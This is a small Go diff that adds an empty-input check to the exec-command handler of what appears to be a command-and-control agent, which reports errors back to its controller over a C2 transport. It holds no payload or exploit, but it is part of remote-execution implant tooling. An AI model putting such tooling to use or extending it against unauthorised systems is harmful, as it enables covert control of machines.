@@ -109,6 +109,12 @@ func execCmdRun(cmd *cobra.Command, args []string) {
 		return
 	}
 	parsed := util.ParseCmd(cmdStr)
+	if len(parsed) == 0 {
+		// ParseCmd yields no tokens for whitespace-only input; accessing
+		// parsed[0] below would panic and kill the agent.
+		c2transport.NotifyC2(cmd, "exec: no command to execute")
+		return
+	}
 	if runtime.GOOS == "windows" && !strings.HasSuffix(parsed[0], ".exe") {
 		// Only append .exe if the bare name doesn't resolve on its own.
 		// exec.LookPath honours PATHEXT so names like "echo" resolve correctly.
